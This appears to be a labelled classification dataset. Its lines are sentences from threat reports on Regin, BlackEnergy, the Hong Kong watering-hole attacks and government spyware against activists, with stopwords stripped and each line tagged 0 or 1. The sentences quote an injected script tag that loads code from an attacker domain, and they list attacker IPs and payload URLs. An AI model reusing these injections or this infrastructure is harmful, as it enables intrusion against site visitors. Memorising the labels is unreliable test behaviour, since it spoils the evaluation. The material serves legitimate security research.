With Regin 's modular nature Stage 4 kernel modules Stage 5 user modules ( payloads ) provide functionality export routines using major minor numbering scheme	0
The files Stage 4 loaded Stage 3 consist user-mode orchestrator multiple kernel payload modules	1
They stored two EVFS containers files • % System % \config\SystemAudit.Evt Contains Stage 4 kernel drivers constitute kernel mode part Regin 's payload	0
• % System % \config\SecurityAudit.Evt Contains user mode version Stage 3	0
The files injected services.exe	0
When attackers operated Regin cleaned compromised computers finished often failed remove Stage 4 5 artifacts system	1
Stage 4 also uses export methodology described Stage 3	0
Stage 5 consists main Regin payload functionality	0
The files Stage 5 injected services.exe Stage 4	1
Stage 5 files EVFS containers containing files Regin 's payload involves DLLs contained SystemLog.evt EVFS container	0
The payload functionality differs depending targeted computer	0
Custom payload files likely delivered specific environment	0
Example payload functionality seen date includes Regin stores data files payloads disk encrypted virtual file system files	1
Such files accessed major routines 3Dh	0
Files stored inside EVFS containers encrypted variant RC5 using 64-bit blocks 20 rounds	1
The encryption mode reverse cipher feedback ( CFB )	1
Known extensions EVFS containers *.evt *.imd	0
The structure container similar FAT file system	0
One major difference files name ; instead 're identified using binary tag	0
The tag concatenation major number minor number	0
The major number typically indicates major function group handle file	0
A container starts header Table 3 ( little-endian ordering )	0
The header followed file entry table ( Table 4 )	0
Each file entry 13h+taglen bytes long	0
The sectors follow ( Table 5 )	0
A sector sectsize bytes starts DWORD pointing next sector ( file fit within single sector ) followed sectsize-4 bytes payload data	0
As explained files encrypted	1
Other layers encryption compression may also place although would handled higher level components	0
Regin 's C & C operations extensive	1
These backchannel operations bidirectional means either attackers initiate communications compromised computers border network compromised computers initiate communications attacker	1
Furthermore compromised computers serve proxy infections command control also happen peer-to-peer fashion	1
All communications strongly encrypted happen two-stage fashion attacker may contact compromised computer using one channel instruct begin communications different channel	1
Four transport protocols available C & C • ICMP Payload information encoded embedded lieu legitimate ICMP/ping data	1
The string 'shit ' scattered packet data validation	0
In addition CRC checks use seed '31337 '	0
• HTTP Payload information encoded embedded within cookie data names SESSID SMSWAP TW WINKER TIMESET LASTVISIT AST.NETSessionId PHPSESSID phpAdsd	1
This information combined another cookie validation names USERIDTK UID GRID UID=PREF=ID TM utma LM TMARK VERSION CURRENT	0
The C & C operations undertaken various modules including major groups C373h 19h 9 well Stage 5 payloads C375h 1Bh	1
Regin logs data ApplicationLog.dat file	1
This file encrypted container encrypted compressed	1
Regin distributed various payload modules receive payload modules infection	1
The extensible nature Regin custom payloads indicate many additional payloads likely exist order enhance Regin 's capabilities	0
Furthermore found data files accompanying payload modules recovered	0
The following table describes Stage 4 kernel payload modules Stage 5 user mode payload modules seen several variants Regin use	0
The IIS web server log stealing module 27E9h example payload module installed initial infection specifically deployed particular target	1
Only small amount 64-bit Regin files recovered	0
These samples may represent version 2.0 differences may possibly solely specific 64-bit versions Regin	0
We also recovered files infected computers may may associated 64-bit Regin including several variants svcsstat.exe file aims retrieve binary data pipes sockets execute data	1
The recovered files appear fundamentally vary 32-bit counterparts apart noteworthy differences	0
The 32-bit 64-bit versions Regin use different file names	0
These differences shown first section paper well appendix	0
Most importantly 64-bit version Regin names containers changed The 64-bit version Regin 's Stage 1 ( wshnetc.dll ) longer kernel mode driver drivers 64-bit Windows must signed	0
Instead Stage 1 user mode DLL loaded Winsock helper computer starting	1
Rather loading Stage 2 NTFS extended attribute Stage 1 looks last partition ( terms physical location ) disk searches payload raw sectors area disk	1
The 64-bit Regin 's Stage 3 recovered	0
We believe may exist 32-bit version driver	0
Stage 4 orchestrator like 32-bit counterpart uses major minor values export functionality	0
No Stage 5 payload modules recovered	0
Regin highly-complex threat used large-scale data collection intelligence gathering campaigns	1
The development operation threat would required significant investment time resources	0
Threats nature rare comparable Stuxnet/Duqu family malware	0
The discovery Regin serves highlight significant investments continue made development tools use intelligence gathering	0
Many components Regin still gone undiscovered additional functionality versions may exist	0
Symantec Norton products detect threat Backdoor.Regin	0
Regin 's data files classified Stage 5 components contained EVFS container	0
As data files stored container names	0
Just like Stage 5 modules referenced filetag aggregation major minor identifiers	0
The major identifier indicates major routine group likely handles creates file	0
Not data files recovered information remains incomplete	0
Data files associated Stage 4 kernel modules recovered Table 8 lists recovered data files used Stage 5 modules	0
The associated modules supposedly manipulate data files recovered	0
The following details used help determine whether impacted threat	0
The BlackEnergy malware crimeware turned APT tool used significant geopolitical operations lightly documented past year	0
An even interesting part BlackEnergy story relatively unknown custom plugin capabilities attack ARM MIPS platforms scripts Cisco network devices destructive plugins certificate stealer	0
Here present available data - difficult collect APT	0
We also present details targets previously unavailable present related victim profile data	0
These attackers careful hide defend long - term presence within compromised environments	0
The malware 's previously undescribed breadth means attackers present new technical challenges unusual environments including SCADA networks	0
Challenges like mitigating attackers ' lateral movement across compromised network routers may take organization 's defenders far beyond standard routine comfort zone	0
BlackEnergy2 BlackEnergy3 known tools	0
Initially cybercriminals used BlackEnergy custom plugins launching DDoS attacks	1
There indications many groups possess tool	0
BlackEnergy2 eventually seen downloading crimeware plugins - custom spam plugin banking information stealer custom plugin	1
Over time BlackEnergy2 assumed toolset BE2/Sandworm actor	0
While another crimeware group continues use BlackEnergy launch DDoS attacks BE2 APT appears used tool exclusively throughout 2014 victim sites included custom plugins scripts	1
To clear name actor BE2 APT called " Sandworm Team " also	0
Before evidence BlackEnergy2 use targeted attacks uncovered tracked strange activity one BlackEnergy CnC servers 2013	0
This strangeness related values listed newer BlackEnergy configuration files	0
As described Dmitry 's 2010 Black DDoS ' analysis configuration file downloaded server main.dll infected system	1
The config file provides download instructions loader	0
It also instructs loader pass certain commands plugins	0
In particular case 2013 config file included unknown plugin set aside usual ' ddos ' plugin listing	0
Displayed new xml formatted plugin names " weap_hwi " " ps " " vsnet " BlackEnergy configuration file download c2 server	0
This new module push must among first group module versions listed " version 1 " including ddos plugin	0
The ' ps ' plugin turned password stealer	0
The ' vsnet ' plugin intended spread launch payload ( BlackEnergy2 dropper moment ) local network using PsExec well gaining primary information user 's computer network	1
Most surprising ' weap_hwi ' plugin	0
It ddos tool compiled run ARM systems	0
At first n't know whether ARM plugin listed intentionally mistake proceeded collect CnC 's config files	0
After pulling multiple config files confirmed ARM object inclusion one - mistake	0
The server definitely delivered config files Windows also ARM / MIPS platform	1
Though unusual ARM module delivered server processed config file	1
Over time able collect several plugins well main module ARM MIPS architectures	0
All ARM / MIPS object files compiled source later pushed one config " weap_msl " " weap_mps " " nm_hwi " " nm_mps " " weap_hwi " " nm_msl "	0
It 's interesting BE2 developers upgraded ddos plugin version 2 along nm_hwi nm_mps nm_msl plugins	0
They simultaneously released version 5 weap_msl weap_mps weap_hmi plugins	0
Those assignments likely arbitrary group developed BlackEnergy2 several years professional organized style	0
Here list retrieved files related functionality The developers ' coding style differed across ' Hook ' main module plugins Windows main.dll	0
The hook main module contained encrypted strings handled function calls strings references large structure	0
This structure obfuscation may rewrite effort better modularize code could also intended complicate analysis	0
Regardless likely different individuals coded different plugins	0
So BE2 effort must small team plugin multiplatform developers	0
After decrypting strings became clear Linux Hook main module communicated CnC server Windows modules	1
This Linux module process following commands similar Windows version	0
After disclosure unusual CnC server pushed Linux new Windows plugins paid greater attention new BE2 samples associated CnCs	0
During extended period able collect many Windows plugins different CnC servers without ever noticing Linux plugins downloaded described	0
It appears BE2/SandWorm gang protected servers keeping non - Windows hacker tools plugins separate servers server folders	0
Finally CnC server hosts different set plugins meaning server works different victims uses plugins based current needs	0
Here summary list known plugins moment	0
We pretty sure list BE2 tools complete	0
For example yet obtain router access plugin confident exists	0
Evidence also supports hypothesis decryption plugin victim files ( see )	0
Our current collection represents BE2 attackers ' capabilities quite well	0
Some plugins remain mysterious purpose yet clear like ' usb ' ' bios '	0
Why would attackers need information usb bios characteristics ? It suggests based specific USB BIOS devices attackers may upload specific plugins carry additional actions	1
Perhaps destructive perhaps infect devices	0
We n't know yet	0
It 's also interesting point another plugin – ' grc '	0
In BE2 configuration files notice value " gid " type	0
This number ID plus.google.com service used ' grc ' plugin parse html	0
It downloads decrypts PNG file	0
The decrypted PNG supposed contain new CNC address never observed one	0
We aware two related GooglePlus IDs	0
The first one plus.google.com/115125387226417117030/ contains abnormal number views	0
At time writing count 75 million	0
The second one - plus.google.com/116769597454024178039/posts - currently modest little 5,000 views	0
All account 's posts deleted	0
During observation described " router - PC " CnC tracked following commands delivered config file server went offline	0
Our observation related actions	0
The issued commands Linux plugins suggest attackers controlled infected MIPS / ARM devices	1
We want pay special attention DDoS commands meant routers	0
188.128.123.52 belongs Russian Ministry Defense 212.175.109.10 belongs Turkish Ministry Interior 's government site	0
While many researchers suspect Russian actor behind BE2 judging tracked activities victim profiles 's still unclear whose interests represent	0
While observing CnCs pulling config files stumbled upon strange mistakes mis - typing	0
They highlighted image	0
First mistakes suggest BE2 attackers manually edit config files	0
Secondly shows even skilled hackers make mistakes	0
The contents config files fairly interesting	0
They contain callback c2 hardcoded ip address contain timeouts contain commands listed	0
We include list observed hardcoded ip C2 addresses along address owner geophysical location host	0
It 's interesting one servers Tor exit node	0
And according collected config files group upgraded malware communications plain text http encrypted https October 2013	0
BlackEnergy2 victims widely distributed geographically	0
We identified BlackEnergy2 targets victims following countries starting late 2013	0
There likely victims	0
Victim profiles point expansive interest ICS	0
However also noticed target list includes government property holding technology organizations well	0
We gained insight significant BE2 victim profiles summer 2014	0
Interesting BE2 incidents presented	0
The BE2 attackers successfully spearphished organization exploit current CVE metasploit module available This email message contained ZIP archive EXE file inside appear executable	1
This crafted zip archive exploited WinRAR flaw makes files zip archives appear different name file extension	0
The attached exe file turned ' BlackEnergy - like ' malware researchers already dubbed ' BlackEnergy3 ' - gang uses along BlackEnergy2	0
Kaspersky Lab detects ' BlackEnergy3 ' malware Backdoor Win32.Fonten – naming dropped file " FONTCACHE.DAT " When investigating computers company 's network BE2 associated files found suggesting BE3 used first - stage tool network	0
The config files within BE2 contained settings company 's internal web proxy	0
As APT - specific BE2 stores downloaded plugins encrypted files system ( seen older versions – plugins - memory ) administrators able collect BE2 files infected machines	1
After decrypting files could retrieve plugins launched infected machines ps vsnet fs ss dstr	0
By appearances attackers pushed ' dstr ' module understood revealed wanted hide presence machines	1
Some machines already launched plugin lost data became unbootable	0
Also machines documents encrypted related plugin could found	0
The second organization hacked via first victim 's stolen VPN credentials	0
After second organization notified infection started internal investigation	0
They confirmed data destroyed machines BE2 attackers exhibited level destructive activity	0
And revealed Cisco routers different IOS versions hacked	1
They n't able connect routers telnet found following " farewell " tcl scripts router 's file system	0
Ciscoapi.tcl – contains various wrappers cisco EXEC - commands described comments	0
The comment includes punchy message " kasperRsky "	0
Killint.tcl – uses Ciscoapi.tcl implements destroying functions	0
The script tries download ciscoapi.tcl certain FTP server served storage BE2 files	1
The organization managed discover scripts hosted server BE / SandWorm gang deleted unfortunately could n't restore deleted	0
The BE2 actor performs careful professional activity covering tracks	0
There evidence logs produced scripts also stored FTP server particular information CDP neighbors provided one procedures ciscoapi.tcl	0
The third organization got compromised type attack first one ( EXE file spoofing doc within Zip archive )	0
All plugins discovered BE2 files known revelation hacked network devices side destroyed data	0
The noticeable thing many computers contained BE2 BE3 files config files contained following URL	0
hxxps://46.165.222(dot)28/upgrade / f3395cd54cf857ddf8f2056768ff49ae / getcfg.php The URL contains md5 string ' router '	0
One discovered config files contained URL yet unidentified md5	0
hxxps://46.165.222(dot)28/upgrade / bf0dac805798cc1f633f19ce8ed6382f / upgrade.php A set victims discovered installed Siemens SCADA software ICS environment responsible downloading executing BlackEnergy	0
Starting March 2014 ending July 2014 Siemens " ccprojectmgr.exe " downloaded executed handful different payloads hosted 94.185.85.122/favicon.ico	1
They detected variants " Backdoor Win32.Blakken "	0
Each config file within BE2 main.dll field called build_id identifies malware version operators	0
Currently particular BE / SandWorm gang uses certain pattern build ids containing three hex numbers three letters follows	0
0C0703hji The numbers indicate date file creation format Year - Month - Day	0
Still purpose letters unknown likely indicates targets	0
The hex numbers n't used time sometimes observed decimal numbers	0
100914_mg 100929nrT Most interesting us earliest build could find	0
Currently " OB020Ad0V " meaning BE2/SandWorm APT started operating early beginning 2010	0
While BE dropper installs driver randomly picked non - used Windows driver name like % system32%\drivers\AliIde.sys	1
The driver self - signed 64-bit systems However new " APT " BE2 uses one following filenames used encrypted storage plugins network settings	0
They consistent serve stable IoC.	0
BE2 also uses start menu locations persistence	1
Users\user\AppData\Roaming\Microsoft\Windows\Start Menu\Programs\Startup\flashplayerapp.exe BE3 uses following known filenames	0
% USERPROFILE%\NTUSER.LOG % LOCALAPPDATA%\FONTCACHE.DAT BE2 MD5s	0
BE3 MD5s	0
Botnet History Illustrated BlackEnergy 2 PH Days Kaspersky Lab - Maria Garnaeva Sergey Lozhkin May 2014 BlackEnergy Quedagh ( pdf ) F - Secure September 2014 Sandworm iSIGHT Partners October 2014 Alert ( ICS - ALERT-14 - 281 - 01A ) Ongoing Sophisticated Malware Campaign Compromising ICS ( Update A ) ICS - CERT October 2014	0
Posted October 9 2014 Steven Adair Over last months Volexity tracking particularly remarkable advanced persistent threat ( APT ) operation involving strategic web compromises websites Hong Kong Japan	0
In countries compromised websites particularly notable relevance current events high profile nature organizations involved	0
In particular Hong Kong compromises appear come heels Occupy Central Campaign shifting high gear	0
These compromises discovered following identification malicious JavaScript added legitimate code impacted websites	1
This code meant visitors potentially subjected exploit malicious Java Applets designed install malware systems	1
While investigating cases Volexity also discovered additional APT attack campaigns involving multiple pro - democratic websites Hong Kong	0
These attempts exploitation compromise digital surveillance detailed throughout post	0
Warning Many websites may still compromised present risk visitors	0
Browse caution	0
Alliance True Democracy € " Hong Kong Over last two days Volexity observed malicious code served website Alliance True Democracy ( ATD ) Hong Kong ( www.atd.hk )	1
ATD alliance people organizations dedicated democracy universal suffrage Hong Kong	0
At time writing malicious code still live website please visit care website clean	0
Below screen shot malicious code references found pre - pended JavaScript file website named superfish.js	0
This JavaScript file called parts website effectively nests loading additional JavaScript written interpeted	0
script language = javascript src = http://java - se.com / o.js</script The domain name java-se.com known bad associated APT activity	0
At time post domain hosted Japanese IP address 210.253.101.105	0
7506 | 210.253.96.0/20 | INTERQ | JP | GMO.JP | GMO INTERNET INC	0
Volexity yet actually see contents file o.js websites continuously returned HTTP 403 responses time requested	0
The file requested IP addresses throughout Asia without ever returning valid content	0
It € ™s unclear code activated certain times whitelist IPs restricting access file specific targets	0
This code also observed served another Hong Kong website described next section	0
While examining ATD website Volexity also observed site password protected backdoor webshell placed	1
This fairly popular webshell Volexity encountered several occasions dealing website compromises	0
Volexity refers shell Angel Webshell named default password € œangel € ​.	0
The shell simply display text € œPassword € ​ text input box Login button	0
A screen shot webshell observed ATD website seen	0
Despite shell written PHP displaying simple Login prompt easy identify Angel webshell based unique components viewable HTML source code	0
The HTML source page displayed following image	0
While Volexity operates assumption attackers placed webshells webservers compromised particular instance seen certainty	0
Attackers often upload new webshells add simple China Chopper style modifications legitimate existing files attempt maintain persistence systems	1
In last week Volexity also observed English Chinese language websites Democratic Party Hong Kong compromised malicious code found ont ATD website ( www.dphk.org | eng.dphk.org )	0
DPHK pro - democracy political party Hong Kong	0
Like ATD website time writing DPHK websites also serving malicious code please browse caution	1
During research post also became aware multiple public reports related compromise DPHK website Twitter via ThreatConnect	0
Our good friend Claudio Giurianeri posted following tweet October 3 2014 The website Democratic Party Hong Kong compromised still	0
Let know	0
# OccupyCentral Diving replies tweet plethora information regarding exploit domain java-se.com	0
In particular tweet Brandon Dixon relevant data PassiveTotal project details several subdomains IP addresses associated java-se.com	0
While Volexity observed handful hostnames wild thus far active subdomains suggest could additional - going exploit malware activity domain	0
Additional reporting activity another going back August 2014 also recently shared ThreatConnect	0
Despite attention DPHK website still compromised references JavaScript hostile domain	0
It also worth noting first time DPHK website used strategic web compromise	1
Back May 2011 Kaspersky Lab reported website leveraged target users Flash Exploits	1
The DPHK appears high value respect targeting visitors	0
During course investigating activity related ATD DPHK websites Volexity also observed website political coalition pan - democratic organization People Power Hong Kong ( www.peoplepower.hk ) compromised well	1
However unlike two websites People Power website contain JavaScript modifications pointing java- se.com	0
Instead website appears malicious iFrames leveraging Chinese URL shortener 985.so	0
At bottom several pages People Power website four iFrames seen screen shot website source	0
Those links exception first one redirect exploit pages Hong Kong IP address 58.64.178.77	0
These pages load scripts conduct profiling system various software plugins related information well load Java exploits designed install malware target system	1
If successful exploits install either 32-bit 64-bit version malware	1
Both files found within Java Archives files	0
Below details malware files	0
Filename main.dll File size 13824 bytes MD5 hash 1befa2c2d1bfc8e87d52871c868f75fe SHA1 hash 8f81bb0bfa6b3ebf3ef4ea283b23a5ccae5b6817 Notes 32-bit version malware beacons 58.64.178.77:443	0
Filename main64.dll File size 15872 bytes MD5 hash a482a84d13c76b950ce5bc7e75f4edef SHA1 hash c0a4b9145e0066f5c1534beddc9c666ea8eb0882 Notes 64-bit version malware beacons 58.64.178.77:443	0
At time writing People Power website still serving malicious code	1
Volexity recommends avoiding website and/or browsing caution	0
Volexity believes separate group attackers responsible exploit activity affiliated java-se.com operations	0
While digging deeper pro - democratic websites Hong Kong Volexity also discovered peculiar code website pro- democratic pro - universal suffrage public policy think thank The Professional Commons ( www.procommons.org.hk )	0
In case website suspicious JavaScript code writes iFrame pointing back non - existent HTML page hotel website South Korea	0
The code website seen screen shot	0
The URL question points	0
hXXp://www.hotel365.co.kr / Lnk / tw / index.html This link work redirect visitor back main page website	0
There appear reason Professional Commmons website hidden iFrame link randomly placed middle HTML code	0
It suspected formerly active exploit URL	0
If actually malicious possible code could - activated time	0
Volexity recommend URL Professional Commons website browsed caution	0
In early September APT group behind java-se.com raised visibility Volexity € ™s radar following compromise effectively impacted many components Japanese Nikkei	0
In first week September subdomain used load JavaScript code additional files onto Nikkei web properties www.nikkei.com asia.nikkei.com compromised	0
In particular JavaScript file loaded parts.nikkei.com modified reference another JavaScript file jre76.java-se.com hosted Japanese IP address 211.125.81.203	0
7506 | 211.125.80.0/22 | INTERQ | JP | GMO.JP | GMO INTERNET INC	0
The code since taken	0
However early September JavaScript pre - pended file http://parts.nikkei.com/parts/SC/s_cDS.js seen screen shot	0
Like JavaScript ATD DPHK websites Volexity never actually able obtain live copy script	0
Each request results HTTP 403 response server	0
Volexity suspects code either active select times and/or served subset visitors	0
The code observed s_cDS.js file nearly month	0
While tracking APT activity Volexity also come across seemingly unrelated compromises websites Hong Kong Japan associated java-se.com activity	0
Despite several sites compromised activity tied java-se.com result successful capture actual exploit code malware	0
However research websites activity involving java-se.com lead Volexity live exploits malware	0
In particular Volexity came across live exploit code hosted jdk-7u12-windows-i586.java-se.com Japanese IP address 210.253.96.200	0
7506 | 210.253.96.0/20 | INTERQ | JP | GMO.JP | GMO INTERNET INC	0
This system hosted JavaScript file turned loads malicious Java Applet	1
In testing Java Applet pops notification user asking want run applet	0
Volexity enough time thoroughly analyze file see actual exploit attackers rely user assisted malware installation	0
The pop - make appear file update Java	0
The popup displayed Java displayed	0
As seen image popup could misconstrued user update Java despite java-se.com domain Publisher listed WindySoft	0
Interestingly Java Archive loaded digitally signed certificate issued WindySoft online gaming company South Korea	0
We confirm certificate actually belonged WindySoft point time however fairly established precedent certificates online gaming companies used digitally sign malware attack tools	0
As one might expect choosing press Run button would bad news someone presented prompt	0
If one click Run prompt would result file css.jpg download encrypted channel folder https://elsa-jp.jp	0
Note elsa-jp.jp website hosted IP address jdk-7u12-windows-i586.java-se.com likely compromised	0
The file css.jpg course JPEG file executable encoded single - byte XOR key 0xFF	0
Filename css.jpg File size 168776 bytes MD5 hash b3a9e6548fb3cc511096af4d68b2e745 SHA1 hash 394703d1240ccd3aaeeef50c212313e3036741b1 Notes Executable file downloaded Java Applet encoded XOR 0 -99 Taking closer look resulting executable turns newer sample PlugX.	0
In particular sample interesting notable string observed	0
C:\wocawocawoca\piao\Release\caca.pdb Also interest observed Java Applet executable also digitally signed certificate issued € œWindySoft	0
€ ​ Upon execution malware sample immediately DNS resolution following hostname	0
jduhf873jdu7.blog.163.com The PlugX sample connects blog parses page command connect next	1
This similar method described FireEye blog Operation Poisoned Hurricane	0
The primary difference attackers opted use 163.com Blog Google Code page embed command	0
Taking closer look Blog page following post observed	0
The primary string focus title post DZKSCAAAAJPBBDHDDDOCCDFDFDOCCDBDHDOCHDHDDZJS Using decoding routine describe Cassidian PlugX post earlier year see command decodes instruct malware connect U.S .- based Linode IP address Hurricane Electric 173.255.217.77	0
6939 | 173.255.208.0/20 | HURRICANE | US | LINODE.COM | LINODE A look passive DNS identifies several hostnames recently resolved IP address	0
The ones still resolve IP listed	0
These hostnames may related time writing seen use malware unable confirm	0
As seen several years dissenting groups especially seeking increased levels freedom frequently find targeted surveillance information extraction	0
In digital age strategic web compromise ( exploit drive - ) become key weapon choice conduct operations	0
These types attacks far overt typical target victim opted go believe safe trusted website	0
In case post appears least two different attackers involved compromising placing malicious code Pro - Democratic websites Hong Kong	1
This first time surely last time favor democracy Hong Kong targeted	0
Unfortunately level access infrastructure attackers appear quite uphill battle	0
Continuing expose attack one means shines light attack operations aim putting dent success	0
Repressive nation-states long monitored telecommunica- tions keep tabs political dissent	0
The Internet online social networks however pose novel technical challenges practice even open new domains surveil- lance	0
We analyze extensive collection suspicious files links targeting activists opposition members non- governmental organizations Middle East past several years	0
We find artifacts reflect efforts at- tack targets ' devices purposes eavesdropping stealing information and/or unmasking anonymous users	0
We describe attack campaigns observed Bahrain Syria United Arab Emirates investigating attackers tools tech- niques	0
In addition off-the-shelf remote access trojans use third-party IP-tracking services identify commer- cial spyware marketed exclusively governments including Gamma 's FinSpy Hacking Team 's Remote Control Sys- tem ( RCS )	0
We describe use Bahrain UAE map potential broader scope activity conduct- ing global scans corresponding command-and-control ( C & C ) servers	0
Finally frame real-world consequences campaigns via strong circumstantial evidence linking hacking arrests interrogations imprisonment	0
Computer security research devotes extensive efforts pro- tecting individuals indiscriminate large-scale attacks used cybercriminals	0
Recently prob- lem protecting institutions targeted attacks conducted nation-states ( so-called '' Advanced Persistent Threats '' ) likewise elicited significant research interest	0
Where two problem domains intersect however-targeted cyber attacks nation-states individuals-has received virtually sig- nificant methodical research attention date	0
This new prob- lem space poses challenges technically complex significant real-world importance	0
In work undertake characterize emergent prob- lem space nation-state Internet attacks individuals engaged pro-democracy opposition movements	0
While lack data fully comprehensive fashion provide extensive detail technical operational perspectives seen three countries	0
We view character- izations fundamental first step necessary rigorous scientific pursuit new problem space	0
For study draw upon several years research conducted cases Bahrain Syria United Arab Emirates	0
We frame nature attacks technology infrastructure used conduct con- text impacts real people	0
We hope process inspire additional research efforts addressing difficult prob- lem adequately protect individuals limited resources facing powerful adversaries	0
As illustration phenomenon consider follow- ing anecdote pieced together public reports court documents	0
At dawn 3/12/13 police raided house 17-year- old Ali Al-Shofa confiscated laptop phone took custody	0
He charged referring Bahrain's King '' dictator '' ( ) '' fallen one '' ( ) pseudonymous Twitter account @ alkawarahnews	0
Accord- ing court documents Bahrain 's Cyber Crime Unit linked IP address registered father 's name account 12/9/12	0
Operators @ alkawarahnews later forwarded suspicious private message one authors	0
The message received 12/8/12 Facebook account linked Twitter handle contained link protest video purport- edly sent anti-government individual	0
The link redirected iplogger.org service records IP address anyone clicks	0
Analytics link indicate clicked inside Bahrain	0
On 6/25/13 Ali sentenced one year prison	0
Ali 's case example larger phenomenon in- vestigate attacks activists dissidents trade unionists human rights campaigners journalists members NGOs ( henceforth '' targets '' ) Middle East	0
The attacks documented usually involve use malicious links e-mail attachments designed obtain information device	1
On one hand observed attacks using wide range off-the-shelf spyware well publicly available third-party services like iplogger.org	1
On hand at- tacks use so-called '' lawful intercept '' trojans related equip- ment purportedly sold exclusively governments compa- nies like Gamma International Hacking Team	1
The lat- ter advertises governments need technology '' look target 's eyes '' rather rely solely '' passive monitoring ''	0
Overall attacks document rarely technically novel	0
In fact suspect majority at- tacks could substantially limited via well-known security practices settings software updates	0
Yet attacks noteworthy careful social engineering links governments real-world impact	1
We obtained majority artifacts encouraging in- dividuals might targeted governments provide us suspicious files unsolicited links especially un- familiar senders	0
While process provided rich set artifacts analyze permit us claim dataset representative	0
Our analysis links attacks common class ac- tor attacker whose behavior choice target use in- formation obtained attack aligns interests government	0
In cases Ali 's attackers appear governments ; cases appear in- stead pro-government actors ranging patriotic necessarily skilled volunteers cyber mercenaries	0
The phe- nomenon identified Libya fall Gaddafi 's regime revealed direct government ties hacking 2011 Civil War	0
We make following contributions • We analyze technology associated targeted at- tacks ( e.g. malicious links spyware ) trace back programmers manufacturers	0
While attacks novel-and indeed often involve technology used cybercrime underground-they significant be- cause real-world impact visibility connected governments	0
In addition often find amateurish mistakes either attacker 's technology operations indicating energy spent countering threats realize significant benefits	0
We how- ever conclude nation-state attacks attackers incompetent suspect attacks evaded detection	0
• When possible empirically characterize attacks technology observed	0
We map global use two commercial hacking tools governments searching Internet scan data using fingerprints command-and-control ( C & C ) servers derived spyware analysis	0
• We develop strong evidence tying attacks govern- ment sponsors corporate suppliers countering de- nials sometimes energetic sometimes indirect involvement [ ] contrast denials claims corporate '' oversight '' board	0
Our scan- ning suggests use '' lawful intercept '' trojans 11 ad- ditional countries considered governed '' authoritarian regimes	0
'' We believe activists journalists countries may experience harassment consequences life liberty government surveillance	0
Finally explore potential defenses appropriate protecting target population work	0
We believe sufficiently well-grounded meaningful manner first requires developing understanding targets ' knowledge security issues posture regarding currently protect resources ( including potentially ed- ucation ) draw upon	0
To end con- ducting ( IRB approval ) in-depth interviews potential targets along systematic examination Internet de- vices order develop understanding	0
In past decades rich body academic work grown document understand government Internet censorship in- cluding nationwide censorship campaigns like Great Fire- wall China [ ]	0
Research governmental Internet surveillance activities like law-enforcement interception comparatively smaller area	0
Some academic work looks government use devices enable censorship key- word blacklists Chinese chat clients Green Dam censorware deployed new computers sold China	0
We aware limited previous work looking advanced threat actors targeting activists hack- ing though work always able establish ev- idence government connections	0
Platforms used potential targets GMail Twitter Facebook increasingly make transport- layer encryption default obscuring communications network surveillance	0
This use encryption along global nature many social movements role diaspora groups likely makes hacking increasingly attractive especially states unable request compel content platforms	0
Indeed increasing use encryption global nature targets cited pur- veyors '' lawful intercept '' trojans marketing materi- als [ ]	0
In one notable case 2009 UAE telecom firm Eti- salat distributed system update 145,000 BlackBerry subscribers contained spyware read encrypted Black- Berry e-mail device	0
The spyware discovered update drastically slowed users ' phones	0
In con- trast country-scale distribution work looks kind pro-government government-linked surveillance highly targeted attacks	0
The term APT ( Advanced Persistent Threat ) refers sophisticated cyber-attacker persistently attempts tar- get individual group	0
Work outside academic community tracking government cyberattacks typically falls umbrella	0
There significant work APT outside academic community especially among se- curity professionals threat intelligence companies human rights groups	0
Much work focused suspected government-on-government government-on-corporation cy- ber attacks [ ]	0
Meanwhile small growing body research deals attacks carried governments opposition activist groups operating within well outside borders	0
One notable cases GhostNet large-scale cyber espionage campaign Tibetan independence movement [ ]	0
Other work avoids drawing conclusions attackers	0
Our study based extensive analysis malicious files suspect communications relevant activities targeted groups Bahrain Syria UAE documented Ta- ble 1	0
A number attacks significant real-world impli- cations per Table 2	0
In many cases keep descriptions somewhat imprecise avoid potential leakage target identi- ties	0
We began work contacted individuals con- cerned government might targeted cyber- attacks	0
As became acquainted targeted com- munities cases contacted targeted groups directly ; others reached individuals connections tar- geted groups allowed us examine communications groups	0
For Bahrain Syria work encompassed 10,000s e-mails instant messages	0
For UAE vol- ume several thousand communications	0
This following sections outline recent targeted hacking cam- paigns Bahrain Syria UAE	0
These cases com- mon theme attacks targets ' computers devices malicious files links	0
In cases attackers employed expensive '' government exclusive '' malware cases attackers used cheap readily available RATs	1
Across cases find clever social engineering often plays central role strong evidence well-informed ad- versary	1
We also however frequently find technical op- erational errors attackers enable us link attacks governments	0
In general attacks find well- detected anti-virus programs	1
We analyzed two attack campaigns context Bahrain government pursuing crackdown Arab-Spring inspired uprising since 2/14/2011	0
The first involved malicious e-mails containing FinSpy '' lawful intercept '' trojan sold exclusively governments	1
The second involved specially crafted IP spy links e-mails de- signed reveal IP addresses operators pseudonymous accounts	1
Some individuals apparently clicked links later arrested including Ali ( cf	0
§1 ) whose click appears used court	0
While campaigns point back government yet identified overlap campaigns ; targets FinSpy appeared reside mainly outside Bahrain whereas IP spy links targeted mainly inside country	0
We examine campaign turn	0
Beginning April 2012 authors received 5 suspicious e-mails US UK-based activists journalists working Bahrain	0
We found attachments contained PE ( .exe ) file designed appear image	1
Their filenames contained Uni- code right-to-left override ( RLO ) character causing Windows render filename gpj.1bajaR.exe instead exe.Rajab1.jpg	1
The .rar files contained Word document embedded ASCII-encoded PE file containing custom macro set automatically run upon document startup	1
Under default security settings Office disables unsigned macros user opens document see informational message macro disabled	0
Thus attack apparently designed belief hope targets would reduced security settings	0
Identification FinSpy By running sample using Windows Virtual PC found following string mem- ory \lsvnbranches\finspyv4.01\finspyv2\	0
This string suggests FinSpy product Gamma Inter- national	0
The executables used virtualized obfusca- tion appeared custom-designed	1
We de- vised fingerprint obfuscater located structurally similar executable searching large malware database	0
This executable contained similar string except identi- fied FinSpy v3.00 attempted connect tiger.gamma-international.de domain registered Gamma International GmbH	1
Analysis capabilities We found spyware modular design download additional modules command & control ( C & C ) server including password cap- ture ( 20 applications ) recording screenshots Skype chat file transfers input computer 's micro- phone webcam	1
To exfiltrate data back C & C server module encrypts writes disk special folder	1
The spyware period- ically probes folder files match certain naming convention sends C & C server	1
It over- writes files renames several times deletes apparent effort frustrate forensic analysis	1
Analysis encryption Because malware employed myriad known anti-debugging anti-analysis techniques thwarted attempts attach debuggers	1
Since in- clude anti-VM code ran TEMU x86 emulator de- signed malware analysis	0
TEMU captures instruction- level execution traces provides support taint-tracking	0
We found FinSpy encrypts data using custom imple- mentation AES-256-CBC	1
The 32 byte AES key 16 byte IV generated repeatedly reading low-order-4-bytes Windows clock	1
